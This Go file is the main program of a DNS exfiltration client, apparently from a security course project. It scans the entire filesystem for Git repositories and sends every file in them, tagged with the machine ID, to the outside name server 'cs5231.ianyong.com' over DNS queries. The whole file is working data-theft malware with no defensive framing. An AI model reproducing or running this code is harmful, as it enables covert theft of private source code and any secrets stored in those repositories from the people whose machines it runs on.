package main

import (
	"dns-exfiltration-client/exfiltrator"
	"errors"
	"io/fs"
	"log"
	"path/filepath"
	"strings"

	"github.com/denisbrodbeck/machineid"
)

const (
	NAME_SERVER = "cs5231.ianyong.com"
	DELAY       = 200
)

var (
	pathsToExfiltrate = make([]string, 0)
	dnsExfiltrator    *exfiltrator.DnsExfiltrator
)

func findGitRepositories(path string, info fs.FileInfo, err error) error {
	if err != nil {
		if errors.Is(err, fs.ErrPermission) {
			return nil
		}
		if strings.HasPrefix(path, "/proc") {
			return nil
		}
		return err
	}

	if info.IsDir() && info.Name() == ".git" {
		dir, _ := filepath.Split(path)
		pathsToExfiltrate = append(pathsToExfiltrate, dir)
	}

	return nil
}

func exfiltrateGitRepositories(path string, info fs.FileInfo, err error) error {
	if err != nil {
		return nil
	}

	// We can only exfiltrate files.
	if info.IsDir() {
		return nil
	}

	dnsExfiltrator.ExfiltrateFile(path)

	return nil
}

func main() {
	machineId, err := machineid.ID()
	if err != nil {
		log.Fatalln(err)
	}

	err = filepath.Walk("/", findGitRepositories)
	if err != nil {
		log.Println(err)
	}

	dnsExfiltrator = exfiltrator.NewDnsExfiltrator(NAME_SERVER, machineId, DELAY)

	for _, path := range pathsToExfiltrate {
		err = filepath.Walk(path, exfiltrateGitRepositories)
		if err != nil {
			log.Println(err)
		}
	}
}
